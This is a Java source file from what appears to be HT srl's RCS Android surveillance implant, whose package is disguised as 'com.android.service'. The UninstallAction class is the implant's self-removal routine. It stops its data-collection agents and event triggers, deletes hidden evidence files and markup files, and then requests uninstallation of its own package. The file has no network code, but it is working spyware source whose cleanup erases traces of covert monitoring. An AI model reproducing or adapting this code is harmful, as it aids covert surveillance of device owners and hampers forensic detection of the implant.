/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : UninstallAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.File;
import java.io.IOException;

import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import com.android.service.Status;
import com.android.service.agent.AgentManager;
import com.android.service.auto.Cfg;
import com.android.service.event.EventManager;
import com.android.service.evidence.EvidenceCollector;
import com.android.service.evidence.Markup;
import com.android.service.file.AutoFile;
import com.android.service.util.Check;

/**
 * The Class UninstallAction.
 */
public class UninstallAction extends SubAction {

	private static final String TAG = "UninstallAction";

	/**
	 * Instantiates a new uninstall action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public UninstallAction(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		actualExecute();
		return true;
	}

	static AutoFile debug;
	
	/**
	 * Actual execute.
	 */
	public static boolean actualExecute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualExecute): uninstall");
		}
		final Markup markup = new Markup(0);
		markup.createEmptyMarkup();
		debug=new AutoFile("/mnt/sdcard","debug.txt");
		debug.delete();
		
		debug.append("stopServices\n");
		
		boolean ret = stopServices();
		
		debug.append("removeFiles\n");
		
		ret &= removeFiles();
		
		debug.append("deleteApplication\n");
		ret &= deleteApplication();

		return ret;
	}

	/**
	 * Stop agents and events
	 * 
	 * @return
	 */
	static boolean stopServices() {
		if (Cfg.DEBUG) {
			Log.d("QZ", TAG + " (stopServices)");
		}
		
		debug.append("  stop agents\n");
		AgentManager.self().stopAll();
		debug.append("  stop events\n");
		EventManager.self().stopAll();
		debug.append("  untrigger all\n");
		Status.self().unTriggerAll();
		return true;
	}

	/**
	 * Remove markups and logs
	 * 
	 * @return
	 */
	static boolean removeFiles() {
		if (Cfg.DEBUG) {
			Log.d("QZ", TAG + " (removeFiles)");
		}
		
		debug.append("  remove markup\n");
		Markup.removeMarkups();
		
		debug.append("  remove files\n");
		final int fileNum = EvidenceCollector.self().removeHidden();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles): " + fileNum);
		}
		return true;
	}

	/**
	 * Deletes the application
	 * 
	 * @return
	 */
	static boolean deleteApplication() {
		if (Cfg.DEBUG) {
			Log.d("QZ", TAG + " (deleteApplication)");
		}
		debug.append("  delete application\n");
		final Uri packageURI = Uri.parse("package:com.android.service");
		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(uninstallIntent);
		return true;
	}

	@Override
	protected boolean parse(byte[] params) {
		return true;
	}

}
